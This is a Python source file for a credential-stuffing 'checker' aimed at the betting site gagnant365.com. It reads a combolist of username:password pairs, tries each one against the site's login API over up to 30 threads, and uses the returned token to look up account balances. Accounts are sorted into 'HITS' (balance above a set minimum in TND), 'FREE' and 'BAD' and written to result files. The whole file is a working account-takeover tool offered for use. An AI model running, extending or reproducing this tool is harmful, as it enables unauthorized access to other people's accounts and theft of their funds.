import tkinter
from tkinter import filedialog
from time import sleep
import datetime
import os
import ctypes
import requests
import time
import keyboard
import threading
from art import *
from colorama import Fore, init, Style
from concurrent.futures import ThreadPoolExecutor
base_path = os.path.dirname(__file__)
lock = threading.Lock()
init(autoreset=True)
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    ctypes.windll.kernel32.SetConsoleTitleW('Gagnant365.com CHECKER BY M97 [V1]')
    clear_screen()
    text = "GAGNANT365.com"
    print(Fore.RED + text2art(text, font= 'standard',))
    print(Fore.RED + text2art('CHECKER  BY  M97', font= 'standard',))

def print_menu(title, options):
    print_header()
    print(Fore.CYAN + Style.BRIGHT + title)
    print(Fore.YELLOW + "=" * len(title))
    for index, option in enumerate(options, start=1):
        print(Fore.GREEN + f"[{index}] {option}")
    print(Fore.CYAN + "=" * len(title))


def update_title():
    title = (
        f"Gagnant365.com CHECKER BY M97 [V1]"
        f"- [CHECKED] : [{testedc}"
        f"/"
        f"{total_lines}]  "
        f"- [CPM] : {cpm} "
        f"- [BAD] : {badc}  "
        f"- [HITS] : {hitc}  "
        f"- [FREE] : {freec}  "
        f"- [ERRORS] : {errorc}"
    )
    ctypes.windll.kernel32.SetConsoleTitleW(title)


def choose_output_dir():
    global output_dir
    root = tkinter.Tk()
    root.attributes('-topmost', True)
    root.title('Gagnant365.com CHECKER BY CHEIKH M97')
    root.withdraw()
    output_dir = filedialog.askdirectory(title='Choose an output folder')
    root.destroy()
    if not output_dir:
        print('NO DIRECTORY SELECTED, Genrerating output path ...')
        print(f"RESULT WILL BE SAVED TO {base_path}")
        return base_path
    return output_dir


def get_thread_count():
    print(Fore.LIGHTMAGENTA_EX + 'PLEASE ENTER A NUMBER BETWEEN 1 AND 30')
    while True:
        thread_count = input('--->')
        if not thread_count.isdigit():
            print(Fore.RED + 'TYPE ERROR : NON DIGIT , PLEASE TRY AGAIN')
            continue
        thread_count = int(thread_count)
        if 1 <= thread_count <= 30:
            return thread_count
        else:
            print(Fore.RED + 'RANGE ERROR : ENTER A DIGIT BETWEEN 1 AND 30')

def get_cpm():
    try :
        return int(testedc / (time.time() - start_time) * 60,)
    except Exception as e:
        return 'N/A'

def get_min(x):
    print(f"Minimun balance for a hit is {x} TND - Default is 0.2 TND")
    while True:
        min = input(("CHANGE MINIMUN BALANCE : --> "))
        if not min.isnumeric():
            print(f"TYPE ERROR : PLEASE CHOOSE A DIGIT")
            continue
        min = float(min)
        print(Fore.GREEN + f"MINIMUM BALANCE IS NOW UPDATED TO {min}")
        return min


def init_var():
    global start_time ,testedc, badc, freec, hitc, errorc , cpm
    badc = 0
    testedc = 0
    freec = 0
    hitc = 0
    cpm = 0
    start_time = time.time()
    errorc = 0


def firstchoice():
    print_menu('Main Menu', [
        'START CHECKING',
        'REMOVE DUPLICATES',
        'SETTINGS',
        'QUIT'
    ])


def settings_choice():
    print_menu("SETTINGS", [
        "Threads - Default is 10",
        "Save BADS? Default is Yes",
        "Change an output folder",
        "Return to main menu",
        "Minimun balance for a HIT"
    ])


def back_to_settings_menu():
    print('BACK TO SETTINGS MENU ? ')
    print('1 ) YES ')
    print('2) NO , QUIT ')
    print('CHOOSE 1 - 2')
    choice = input('-->')
    while not choice in ['1', '2']:
        print(Fore.RED + 'INVALID CHOICE . CHOOSE AGAIN 1 - 2')
        choice = input('-->')
    if choice == '1':
        return True
    elif choice == '2':
        quit()


def make_dir_saving_files():
    ts = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
    path = os.path.join(output_dir, 'RESULTS', ts)
    os.makedirs(path, exist_ok=True)
    hit_file = os.path.join(path, 'HITS.txt')
    free_file = os.path.join(path, 'FREE.txt')
    bad_file = os.path.join(path, 'BAD.txt')
    tocheck_file = os.path.join(path, 'TOCHECK.txt')
    return hit_file, free_file, bad_file, tocheck_file


def get_menu_choice():
    firstchoice()
    while True:
        choice = input('--->')
        if choice not in ['1', '2', '3', '4']:
            print(Fore.RED + 'ERROR : PLEASE CHOOSE A NUMBER BETWEEN 1 AND 4')
            continue
        return int(choice)


def get_settings_choice():
    settings_choice()
    while True:
        choice = input('--->')
        if not choice in ['1', '2', '3', '4', '5']:
            print(Fore.RED + 'ERROR : PLEASE CHOOSE A NUMBER BETWEEN 1 AND 5')
            continue
        return int(choice)


def back_to_main_menu():
    print('BACK TO MAIN MENU ? ')
    print('1 ) YES ')
    print('2) NO , QUIT ')
    print('CHOOSE 1 - 2')
    choice = input('-->')
    while not choice in ['1', '2']:
        print(Fore.RED + 'INVALID CHOICE . CHOOSE AGAIN 1 - 2')
        choice = input('-->')
    if choice == '1':
        return True
    elif choice == '2':
        quit()

def get_balance(result):
    try:
        token = result['token']
        url = "https://v3.gagnant365.com/api/getuser"
        payload = {'token' : token}
        headers = {'content-type': 'application/json'}
        response = requests.post(url, json= payload , headers= headers)
        try:
            res = response.json()
            BALANCE = float(res['Balance'])
        except Exception as ex:
            BALANCE = None
    except Exception as e:
        BALANCE = None
    return BALANCE
def request(x, y):
    global freec, hitc, badc, errorc , cpm , testedc
    url = 'https://v3.gagnant365.com/api/login'
    payload = {'username': x, 'password': y}
    headers = {'content-type': 'application/json'}
    try:
        response = requests.post(url, json=payload, headers=headers)
        if 'Incorrect user name or password' in response.text:
            with lock:
                badc += 1
                res = f"[BAD] : {x}:{y}"
                print(Fore.RED + res)
                if saves_bad:
                    with open(bad_file, 'a') as file:
                        file.write(res + '\n')
        elif '{"token":' in response.text:
            result = response.json()
            Balance = get_balance(result)
            if Balance == None:
                with lock:
                    print(f'ERROR PARSING BALANCE FOR {x}:{y}')
                    errorc += 1
                    with open(tocheck_file,'a') as f:
                        f.write(f"ERROR PARSING BALANCE FOR {x}:{y}\n")
            elif Balance >= min:
                with lock:
                    hitc += 1
                    print(Fore.GREEN + f"[HIT] : {x}:{y} --- [BALANCE] : {Balance} TND")
                    with open(hit_file,'a') as file:
                        file.write(f'HIT : {x}:{y} ---- Balance : {Balance} TND\n')    
            elif Balance < min:
                with lock:
                    freec +=1
                    print(Fore.YELLOW + f"[FREE] : {x}:{y} --- [BALANCE] : {Balance} TND ")
                    with open(free_file,'a') as file:
                        file.write(f'FREE : {x}:{y} ---- Balance : {Balance} TND\n')
    except Exception as e:
        with lock:
            errorc += 1
            res = f"[ERROR] : {x}:{y} {e}"
            print(Fore.WHITE + res)
            with open(tocheck_file, 'a') as file:
                file.write(f'{x}:{y} \n')
    testedc +=1
    with lock:
        cpm = get_cpm()
        update_title()


def import_combo():
    root = tkinter.Tk()
    root.attributes('-topmost', True)
    root.withdraw()
    combo = filedialog.askopenfilename(title='Choose a combolist', filetypes=[("Text files", "*.txt")])
    root.destroy()
    global total_lines
    if not combo:
        print(Fore.RED + 'NO COMBOLIST SELECTED')
        return None, None, 0
    try:
        with open(combo, 'r') as file:
            lines = file.readlines()
            total_lines = len(lines)
            if total_lines == 0:
                print(Fore.RED + 'COMBOLIST IS EMPTY.')
                return None, None, False
            else:
                print(Fore.GREEN + 'COMBOLIST LOADED SUCCESSFULLY.')
                return combo, lines, total_lines
    except FileNotFoundError:
        print(Fore.RED + 'ERROR : FILE NOT FOUND ')
        return None, None, 0
    except Exception as e:
        print(Fore.RED + 'ERROR LOADING FILE')
        return None, None, 0


def remove_duplicates():
    combo, lines, total_lines = import_combo()
    if combo is None:
        return
    output_file_name = os.path.basename(combo)[:len(os.path.basename(combo)) - 4] + ' Duplicate_Removed.txt'
    output_file = os.path.join(output_dir, output_file_name)
    sleep(1)
    print(f"TOTAL LINES : {total_lines}")
    result = list(set(line.strip() for line in lines if line.strip()))
    lr = total_lines - len(result)
    sleep(2)
    print(f"LINES REMOVED : {lr}")
    with open(output_file, 'w') as output:
        output.writelines(f"{line}\n" for line in result)
    sleep(1)
    print(Fore.GREEN + f"SAVED TO {output_file_name} | UNIQUE LINES = {len(result)}")
    return


def main():
    print_header()
    global thread_count, saves_bad, min , testedc
    thread_count = 10
    min = 0.2
    saves_bad = True
    print('Press any key to choose an output folder for your results')
    if keyboard.read_key():
        choose_output_dir()
        print(Fore.LIGHTRED_EX + 'Configuring ...')
        sleep(1)
    while True:
        choice = get_menu_choice()
        if choice == 1:
            init_var()
            print('IMPORT YOUR COMBOLIST ')
            combo, lines, total_lines = import_combo()
            if combo is None or lines is None:
                if not back_to_main_menu():
                    break
                continue
            global hit_file, free_file, bad_file, tocheck_file
            hit_file, free_file, bad_file, tocheck_file = make_dir_saving_files()
            start_time = time.time()
            with ThreadPoolExecutor(max_workers= thread_count) as executor:
                for line in lines:
                        user, password = line.strip().split(':')
                        executor.submit(request, user, password)
            if not back_to_main_menu():
                break
        elif choice == 2:
            remove_duplicates()
            if not back_to_main_menu():
                break
        elif choice == 3:
            settings_menu = True
            while settings_menu:
                ch = get_settings_choice()
                if ch == 1:
                    thread_count = get_thread_count()
                    if not back_to_settings_menu():
                        return
                if ch == 2:
                    print(' Y / N  ? ')
                    saves_bad = str(input('--->'))
                    while not saves_bad in ['Y', 'N']:
                        print(Fore.RED + 'INVALID CHOICE , Please choose "Y" or "N" ')
                        saves_bad = str(input('--->'))
                    print(Fore.GREEN + 'CHANGE SAVED.')
                    saves_bad = saves_bad == 'Y'
                    if not back_to_settings_menu():
                        return
                if ch == 3:
                    output_dir = choose_output_dir()
                    print(Fore.GREEN + f"OUTPUT FOLDER IS NOW SET TO {output_dir}")
                    if not back_to_settings_menu():
                        return
                if ch == 4:
                    settings_menu = False
                if ch == 5:
                    min = get_min(min)
                    if not back_to_settings_menu():
                        return
        elif choice == 4:
            quit()


if __name__ == '__main__':
    main()